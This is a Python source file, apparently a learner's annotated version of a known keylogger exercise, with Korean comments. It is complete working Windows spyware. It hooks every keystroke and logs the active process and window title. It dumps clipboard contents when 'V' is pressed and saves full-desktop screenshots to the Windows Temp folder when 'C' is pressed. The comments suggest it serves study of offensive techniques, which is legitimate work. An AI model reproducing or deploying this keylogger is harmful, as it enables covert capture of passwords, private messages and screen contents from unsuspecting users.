from ctypes import *
import pythoncom
import pyWinhook as pyHook 
import win32clipboard
import win32gui
import win32ui
import win32con
import win32api


#ctype c호환 데이터 타입 라이브러리
user32 = windll.user32
kernel32 = windll.kernel32   #cdecl(c언어) vs stdcall (윈도우 api 프로세스 표준) 따라서 windll사용
psapi = windll.psapi  #api함수제공
current_window = None
count=1
#윈도우 정보 변수 저장
hdesktop = win32gui.GetDesktopWindow()

# java와 같은 방식 상하좌우값 얻음
width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
# https://learn.microsoft.com/ko-kr/cpp/mfc/device-contexts?view=msvc-170
# 디바이스 컨텍스트 정보불러옴
desktop_dc = win32gui.GetWindowDC(hdesktop)
#디바이스 컨텍스트 정보를 토대로 핸들러 확보
img_dc = win32ui.CreateDCFromHandle(desktop_dc)
#파이썬 pyHook 에러로 pyWinHook으로 교체

#마이크로소프트 c++ 빌드 도구 14이상 필요
def get_current_process():
    #현재 활성화 되어 있는 프로그램 창을 찾는다.
    hwnd = user32.GetForegroundWindow() #포그라운드

    # find the process ID
    pid = c_ulong(0) 
    user32.GetWindowThreadProcessId(hwnd, byref(pid)) #프로세스 식별자를 할당(복사해서)

    # store the current process ID
    process_id = "%d" % pid.value  #할당된 프로세스의 pid를 변수에 저장

    #PSPAI 구조   https://github.com/MarioVilas/winappdbg/blob/master/winappdbg/win32/psapi.py 참조
    # LIST_MODULES_DEFAULT    = 0x00
    #LIST_MODULES_32BIT      = 0x01
    #LIST_MODULES_64BIT      = 0x02
    #LIST_MODULES_ALL        = 0x03
    executable = create_string_buffer(b'\x00' * 512)  #1byte의 16진수값 이런게 512개 있는 버퍼생성
    
    
    # https://github.com/MarioVilas/winappdbg/blob/master/winappdbg/win32/kernel32.py 참조
    # kernel32 프로세스 권한 표
    # PROCESS_TERMINATE                 = 0x0001
    # PROCESS_CREATE_THREAD             = 0x0002
    # PROCESS_SET_SESSIONID             = 0x0004
    # PROCESS_VM_OPERATION              = 0x0008
    # PROCESS_VM_READ                   = 0x0010
    # PROCESS_VM_WRITE                  = 0x0020
    # PROCESS_DUP_HANDLE                = 0x0040
    # PROCESS_CREATE_PROCESS            = 0x0080
    # PROCESS_SET_QUOTA                 = 0x0100
    # PROCESS_SET_INFORMATION           = 0x0200
    # PROCESS_QUERY_INFORMATION         = 0x0400
    # PROCESS_SUSPEND_RESUME            = 0x0800
    # PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    
    # 쿼리정보나 메모리읽기?
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # now read it's title
    window_title = create_string_buffer(b'\x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # print out the header if we're in the right process
    print()
    print("[ PID: %s - %s - %s ]" % (process_id,
                                     executable.value,
                                     window_title.value)
          )
    print()

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window
    global count
    # 창이 바뀌고 이벤트 시작하면 타겟변화 감지
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # 아스키 값 읽어드림 / 미국이나 한국 키보드에선 작동하나 다른 키보드에서 오류남
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), end=' ')
    else:
        # added by Dan Frisch 2014
        if event.Key == "V": #컨트롤 v 할수 있으므로 붙여넣기시 v를 누르는 걸 가정해서 클립보드 데이터 읽어옴
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE] - %s" % pasted_value, end=' ')
        elif event.Key == "C":

            # 이미지 내용 생성을 다루는 객체
            mem_dc = img_dc.CreateCompatibleDC()

            # 비트맵 형식으로 변환해서 기록
            screenshot = win32ui.CreateBitmap() #이미지 객체를 생성하고
            screenshot.CreateCompatibleBitmap(img_dc, width, height)# 비트맵 호환 변환
            mem_dc.SelectObject(screenshot) #이미지 할당

            # 할당한 이미지 데이터를 비트 단위로 복사해서 메모리 영역에 저장
            mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

            # save the bitmap to a file
            img_name="c:\\WINDOWS\\Temp\\"+str(count)+".bmp"
            print("[copy] - %s" % img_name, end=' ')
            screenshot.SaveBitmapFile(mem_dc, img_name)

            # free our objects 
            mem_dc.DeleteDC()
            win32gui.DeleteObject(screenshot.GetHandle())
            count=count+1
        else:
            print("[%s]" % event.Key, end=' ')

    # pass execution to next hook registered 
    return True

#========API 실행 순서
# create and register a hook manager
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()
#======================